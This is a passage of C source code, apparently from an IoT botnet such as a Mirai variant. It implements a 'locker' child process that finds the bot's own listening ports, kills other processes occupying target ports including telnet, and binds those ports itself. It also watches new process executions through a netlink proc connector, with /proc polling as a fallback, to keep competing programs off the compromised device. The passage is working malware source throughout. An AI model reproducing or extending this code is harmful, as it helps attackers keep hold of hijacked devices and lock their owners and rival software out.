    } else if (pid == 0) {
        close(pipefd[0]);

        locker_pid = getpid();
        write(pipefd[1], &locker_pid, sizeof(locker_pid));
        close(pipefd[1]);
        
        if (!exe_access()) {
            exit(0);
        }

        
        init_default_ports();
        
        
        uint16_t bot_ports[16];
        int bot_port_count = detect_bot_listening_ports(bot_ports, 16);
        
        #ifdef DEBUG
            printf("[locker] Detected %d bot listening ports\n", bot_port_count);
        #endif
        
        for (int i = 0; i < bot_port_count; i++) {
            #ifdef DEBUG
                printf("[locker] Bot is listening on port %d\n", bot_ports[i]);
            #endif
            add_port_to_lock(bot_ports[i]);
        }

        
        for (int i = 0; i < num_ports_to_lock; i++) {
            
            if (is_port_used_by_bot(ports_to_lock[i])) {
                #ifdef DEBUG
                    printf("[locker] Port %d is used by bot, will attempt takeover if needed\n", ports_to_lock[i]);
                #endif
            } else {
                
            kill_port_processes(ports_to_lock[i]);
            }
        }
        usleep(10000);

        
        for (int i = 0; i < num_ports_to_lock && i < MAX_LOCKED_PORTS; i++) {
            
            locked_ports[i] = hold_port(ports_to_lock[i]);
            
            if (locked_ports[i] < 0) {
                
                if (is_port_used_by_bot(ports_to_lock[i])) {
                    #ifdef DEBUG
                        printf("[locker] Port %d is used by bot, skipping lock (bot owns it)\n", ports_to_lock[i]);
                    #endif
                    
                } else {
                    
                    kill_port_processes(ports_to_lock[i]);
                    usleep(5000);
                locked_ports[i] = hold_port(ports_to_lock[i]);
                    if (locked_ports[i] < 0) {
                        #ifdef DEBUG
                            printf("[locker] Failed to lock port %d after retry\n", ports_to_lock[i]);
                        #endif
                    }
                }
            } else {
                #ifdef DEBUG
                    printf("[locker] Successfully locked port %d\n", ports_to_lock[i]);
                #endif
            }
        }
        
        
        
        if (locked_ports[0] >= 0) {
        telnet_socket = locked_ports[0]; 
        }

        netlink_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_CONNECTOR);
        BOOL use_netlink = FALSE;
        
        if (netlink_fd >= 0) {
            fcntl(netlink_fd, F_SETFL, fcntl(netlink_fd, F_GETFL, 0) | O_NONBLOCK);

            struct sockaddr_nl sa_nl = {
                .nl_family = AF_NETLINK,
                .nl_groups = CN_IDX_PROC,
                .nl_pid = getpid(),
            };

            if (bind(netlink_fd, (struct sockaddr *)&sa_nl, sizeof(sa_nl)) >= 0) {
                if (send_netlink_message(netlink_fd, PROC_CN_MCAST_LISTEN)) {
                    use_netlink = TRUE;
                }
            }
            
            if (!use_netlink) {
                close(netlink_fd);
                netlink_fd = -1;
            }
        }

        int port_check_counter = 0;
        
        if (use_netlink) {
            char buff[BUFF_SIZE];
            struct pollfd fds[1];
            fds[0].fd = netlink_fd;
            fds[0].events = POLLIN;

            while (1) {
                int rc = poll(fds, 1, 250);

                if (rc == -1 && errno == EINTR) {
                    continue;
                } else if (rc == -1) {
                    use_netlink = FALSE;
                    break;
                }

                if (fds[0].revents & (POLLERR | POLLHUP | POLLNVAL)) {
                    use_netlink = FALSE;
                    break;
                }

                if (fds[0].revents & POLLIN) {
                    util_zero(buff, sizeof(buff));

                    size_t n = recv(netlink_fd, buff, sizeof(buff), 0);
                    if (n <= 0) {
                        use_netlink = FALSE;
                        break;
                    }

                    struct nlmsghdr *nlh = (struct nlmsghdr *)buff;
                    while (NLMSG_OK(nlh, n)) {
                        if (nlh->nlmsg_type == NLMSG_NOOP) {
                            nlh = NLMSG_NEXT(nlh, n);
                            continue;
                        }

                        if (nlh->nlmsg_type == NLMSG_OVERRUN || nlh->nlmsg_type == NLMSG_ERROR) {
                            break;
                        }

                        struct cn_msg *cn_hdr = NLMSG_DATA(nlh);
                        if (cn_hdr->id.idx == CN_IDX_PROC && cn_hdr->id.val == CN_VAL_PROC) {
                            struct proc_event *ev = (struct proc_event *)cn_hdr->data;

                            if (ev->what == PROC_EVENT_EXEC) {
                                char pid_str[16] = {0};
                                util_itoa(ev->event_data.exec.process_pid, 10, pid_str);
                                locker_handle_exec(pid_str, ev->event_data.exec.process_pid);
                            }
                        }

                        if (nlh->nlmsg_type == NLMSG_DONE) {
                            break;
                        }

                        nlh = NLMSG_NEXT(nlh, n);
                    }
                }

                port_check_counter++;
                if (port_check_counter >= 4000) {
                    
                    uint16_t bot_ports[16];
                    int bot_port_count = detect_bot_listening_ports(bot_ports, 16);
                    for (int i = 0; i < bot_port_count; i++) {
                        add_port_to_lock(bot_ports[i]);
                    }
                    
                    
                    for (int i = 0; i < num_ports_to_lock && i < MAX_LOCKED_PORTS; i++) {
                        
                        if (is_port_used_by_bot(ports_to_lock[i])) {
                            continue; 
                        }
                        
                        if (locked_ports[i] >= 0) {
                            close(locked_ports[i]);
                        }
                        locked_ports[i] = hold_port(ports_to_lock[i]);
                        if (locked_ports[i] < 0) {
                            
                            kill_port_processes(ports_to_lock[i]);
                            usleep(1000);
                            locked_ports[i] = hold_port(ports_to_lock[i]);
                        }
                    }
                    
                    if (num_ports_to_lock > 0 && ports_to_lock[0] == 23 && locked_ports[0] >= 0) {
                        telnet_socket = locked_ports[0];
                    }
                    port_check_counter = 0;
                }
            }

            send_netlink_message(netlink_fd, PROC_CN_MCAST_IGNORE);
            close(netlink_fd);
            netlink_fd = -1;
        }

        if (!use_netlink) {
            struct stat loock;
            long unsigned int flux = 0;

            while (1) {
                if (stat("/proc/", &loock) == -1) {
                    if (telnet_socket >= 0) close(telnet_socket);
                    exit(0);
                }

                if (!flux) {
                    flux = (long unsigned int)loock.st_nlink;
                    usleep(250);
                    continue;
                }

                if (flux < (uintmax_t)loock.st_nlink) {
                    lock_device();
                    locker_proc();
                }

                flux = loock.st_nlink;
                
                port_check_counter++;
                if (port_check_counter >= 4000) {
                    
                    uint16_t bot_ports[16];
                    int bot_port_count = detect_bot_listening_ports(bot_ports, 16);
                    for (int i = 0; i < bot_port_count; i++) {
                        add_port_to_lock(bot_ports[i]);
                    }
                    
                    
                    for (int i = 0; i < num_ports_to_lock && i < MAX_LOCKED_PORTS; i++) {
                        
                        if (is_port_used_by_bot(ports_to_lock[i])) {
                            continue; 
                        }
                        
                        if (locked_ports[i] >= 0) {
                            close(locked_ports[i]);
                        }
                        locked_ports[i] = hold_port(ports_to_lock[i]);
                        if (locked_ports[i] < 0) {
                            
                            kill_port_processes(ports_to_lock[i]);
                            usleep(1000);
                            locked_ports[i] = hold_port(ports_to_lock[i]);
                        }
                    }
                    
                    if (num_ports_to_lock > 0 && ports_to_lock[0] == 23 && locked_ports[0] >= 0) {
                        telnet_socket = locked_ports[0];
                    }
                    port_check_counter = 0;
                }
                
                usleep(250);
            }
        }
    } else {
        exit(0);
    }
}

void locker_kill(void) {
    if (locker_pid > 0) {
        kill(locker_pid, SIGKILL);
        locker_pid = -1;
    }
    
    if (netlink_fd >= 0) {
        close(netlink_fd);
        netlink_fd = -1;
    }
    
    
    for (int i = 0; i < MAX_LOCKED_PORTS; i++) {
        if (locked_ports[i] >= 0) {
            close(locked_ports[i]);
            locked_ports[i] = -1;
        }
    }
    
    
    
    if (telnet_socket >= 0 && (num_ports_to_lock == 0 || locked_ports[0] != telnet_socket)) {
        close(telnet_socket);
        telnet_socket = -1;
    }
}

